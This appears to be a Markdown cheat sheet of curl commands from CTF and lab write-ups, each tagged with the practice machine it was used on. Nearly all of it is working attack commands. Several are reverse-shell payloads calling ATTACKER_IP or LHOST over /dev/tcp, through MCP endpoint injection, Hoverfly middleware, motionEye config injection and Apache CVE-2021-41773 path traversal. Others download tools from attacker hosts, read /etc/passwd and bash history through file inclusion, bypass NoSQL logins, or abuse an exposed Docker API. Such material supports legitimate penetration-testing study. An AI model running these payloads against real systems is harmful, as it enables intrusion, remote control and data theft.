# curl

## Decryptify Commands

```bash
curl http://$TARGET:1337/js/api.js
curl -X POST http://$TARGET:1337/index.php -d "invite_username=hello@fake.thm&invite_code=TOKEN_GENERATED" -c cookies.txt -L
```
Used on: **Decryptify** - fetched client-side JavaScript and submitted the generated invite token.

## Wreath Commands

```bash
proxychains curl -X POST http://10.200.180.150/web/exploit-tryzub.php --data-urlencode "a=whoami"
curl http://ATTACKER_IP/nc.exe -o c:\windows\temp\nc-USERNAME.exe
```
Used on: **Wreath** - command execution via GitStack webshell and Windows payload download.

HTTP client used for API interaction, exploit delivery (JSON/XML payloads), SOAP injection and reverse shell triggering.

## Commands Used

### MCP API command injection (JSON body)
```bash
curl -k https://mcp.kobold.htb/api/mcp/connect -X POST \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"id","args":[],"env":{}},"serverId":"test"}'
```
Used on: **Kobold** — exploits unsanitized `command` / `args` in an MCP endpoint.

### Reverse shell via JSON payload
```bash
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"/bin/bash","args":["-c","bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"],"env":{}},"serverId":"revshell"}'
```
Used on: **Kobold**

### Password reset abuse / MailHog interception
```bash
curl -X POST http://staging.silentium.htb/api/v1/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email":"ben@silentium.htb"}'

curl http://staging.silentium.htb:8025/api/v2/messages
```
Used on: **Silentium**

### Multipart SOAP XOP Include (arbitrary file read)
```bash
curl -s -X POST http://devarea.htb:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; start="<rootpart@soapui.org>"; start-info="text/xml"; boundary="MIMEBoundary"' \
  --data-binary $'--MIMEBoundary\r\n...<xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/passwd"/>...--MIMEBoundary--\r\n'
```
Used on: **DevArea**

### JWT authentication
```bash
curl -X POST http://devarea.htb:8888/api/token-auth \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"O7IJ27MyyXiU"}'
```
Used on: **DevArea**

### Authenticated RCE via Hoverfly middleware (PUT)
```bash
curl -s -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"binary":"bash","script":"#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"}'
```
Used on: **DevArea**

### Trigger Hoverfly proxy middleware execution
```bash
curl -x http://devarea.htb:8500 http://example.com
```
Used on: **DevArea**

### motionEye config injection through API
```bash
curl "http://127.0.0.1:7999/1/config/setpicture_output=on"
curl "http://127.0.0.1:7999/1/config/setpicture_filename=\$(bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')"
curl "http://127.0.0.1:7999/1/config/setemulate_motion=on"
```
Used on: **CCTV**

### Writing content through Gogs symlink via API
```bash
curl -X PUT "http://127.0.0.1:8080/api/v1/repos/123/pwn/contents/link" \
  -H "Content-Type: application/json" \
  -H "Authorization: token $TOKEN" \
  -d "{\"message\":\"write\",\"content\":\"$PUB\"}"
```
Used on: **Silentium**

### Unauthenticated Docker API abuse
```bash
curl http://DOCKER_HOST_IP:2375/version
curl http://DOCKER_HOST_IP:2375/containers/json

curl -X POST -H "Content-Type: application/json" \
  http://DOCKER_HOST_IP:2375/containers/createname=pwned \
  -d '{"Image":"alpine:latest","Cmd":["sleep","infinity"],"HostConfig":{"Privileged":true,"Binds":["/mnt/host/c/:/mnt/windows"]}}'

curl -X POST http://DOCKER_HOST_IP:2375/containers/pwned/start
```
Used on: **MonitorsFour**

### LFI — read arbitrary files through a PHP page parameter
```bash
curl "http://dev.team.thm/script.php?page=/etc/passwd"
curl "http://dev.team.thm/script.php?page=/etc/vsftpd.conf"
curl "http://dev.team.thm/script.php?page=/etc/ssh/sshd_config"
```
Used on: **Team** — `page` parameter passes input unsanitized to `include()`.

### Codiad authentication (obtain session cookie)
```bash
curl -k -i 'http://TARGET_IP/codiad/components/user/controller.php?action=authenticate' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'username=john&password=password&theme=default&language=en' \
  -c cookies.txt
```
Used on: **IDE** — first step before triggering CVE-2018-14009.

### SOAP command injection (Windows)
```bash
curl.exe -X POST http://127.0.0.1:8000/MonitorService \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: http://tempuri.org/IMonitoringService/KillProcess" \
  -d "<soap:Envelope>...<processName>notepad;type C:\Users\Administrator\Desktop\root.txt</processName>...</soap:Envelope>"
```
Used on: **Overwatch**

### URL-parameter command injection with base64-wrapped output
```bash
curl "http://$TARGET/assets/index.php?cmd=whoami"            # base64 reply -> pipe through `base64 -d`
curl "http://$TARGET/assets/index.php?cmd=/usr/bin/bash%20-c%20'/usr/bin/bash%20-i%20>%26%20/dev/tcp/$LHOST/4444%200>%261'"
```
Used on: **Yueiua** — every space `%20`, every `&` `%26`, every `` `%3F`. See [url-param-command-injection.md](../../exploits/web-rce/url-param-command-injection.md).

### Hidden-API LFI via `show=`
```bash
curl -s "http://$TARGET:5000/api/v1/resources/books?show=/home/sid/.bash_history"
curl -s "http://$TARGET:5000/api/v1/resources/books?show=/etc/passwd"
```
Used on: **Bookstore** — discovered via [hidden-parameter-fuzzing.md](../../exploits/web-disclosure/hidden-parameter-fuzzing.md), feeds [werkzeug-debug-rce.md](../../exploits/web-rce/werkzeug-debug-rce.md).

### Apache 2.4.49 path-traversal (CVE-2021-41773) -- file read
```bash
curl --path-as-is "http://$TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```
Used on: **ohmyweb**

`--path-as-is` is **mandatory** — without it libcurl normalises `..` segments client-side and the server never sees the traversal.

### Apache 2.4.49 path-traversal — RCE via POST to a shell binary
```bash
curl -s --path-as-is -X POST \
  "http://$TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash" \
  -d 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/$LHOST/4444 0>&1'
```
Used on: **ohmyweb** — first two `echo`s emit a valid CGI header; without them Apache returns 500 even though the command ran. Full chain in [apache-path-traversal-rce.md](../../exploits/web-rce/apache-path-traversal-rce.md).

### Pull a static binary into a stripped container
```bash
curl -fsSL http://$LHOST/nmap -o /tmp/nmap && chmod +x /tmp/nmap
curl -fsSL http://$LHOST/CVE-2021-38647.py -o /tmp/exploit.py
```
Used on: **ohmyweb** — `-fsSL` = fail-on-error, silent, show-error, follow-redirects. The default for any one-shot tooling drop. See [container-network-pivoting.md](../../exploits/container/container-network-pivoting.md).

### Bulk-download `.DS_Store` files for offline parsing
```bash
for path in / /assets /assets/js /assets/images /assets/images/shape; do
  curl -fsSL -o "${path//\//_}.DS_Store" "http://$TARGET${path}/.DS_Store"
done
```
Used on: **ohmyweb** — see [ds-store-disclosure.md](../../exploits/web-disclosure/ds-store-disclosure.md).



### WebDAV authenticated upload
```bash
curl -u wampp:xampp -T service http://10.130.148.83/webdav/
curl -u wampp:xampp -T reverse.php http://10.130.148.83/webdav/
```
Used on: **bsidesgtdav** - uploaded a test file and then the PHP reverse shell through WebDAV.

### Trigger uploaded PHP reverse shell
```bash
curl http://$TARGET/dev/rev.php
```
Used on: **coldvvars** - triggered the PHP payload after writing it into the web-accessible SMB-backed path.

### JSON registration and NoSQL login bypass probes
```bash
curl -X POST http://$TARGET/admin/register \
  -H "Content-Type: application/json" \
  -d '{"username": "test123", "password": "test123", "email": "test@test.com"}'

curl -X POST http://$TARGET/admin \
  -H "Content-Type: application/json" \
  -d '{"username": "dave", "password": {"$ne": ""}}' -v
```
Used on: **davesblog** - confirmed registration behavior and exploited MongoDB operator injection in the login request.

### Next.js middleware and React2Shell probes
```bash
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  http://$TARGET:3000/dashboard

curl -X POST http://$TARGET:3000/ \
  -H "Content-Type: multipart/form-data" \
  -H "Next-Action: abc123"
```
Used on: **Reactor** - ruled out middleware bypass and confirmed the React2Shell 500/digest oracle.

### MCP endpoint command execution
```bash
curl -X POST http://$TARGET:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"id","args":[],"env":{}},"serverId":"test"}'

curl -X POST http://$TARGET:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"/bin/bash","args":["-c","bash -i >& /dev/tcp/LHOST/4444 0>&1"],"env":{}},"serverId":"revshell"}'
```
Used on: **DevHub** - triggered blind command execution through MCPJam Inspector.

### Local Node.js inspector discovery
```bash
curl -s http://127.0.0.1:9229/json
```
Used on: **Reactor** - retrieved the V8 inspector WebSocket URL for local privilege escalation.

### SQLi error probe
```bash
curl http://flower.shop/search.php?q=%27
```
Used on: **flower** - triggered a SQL syntax error that confirmed the search parameter reached a MySQL query.
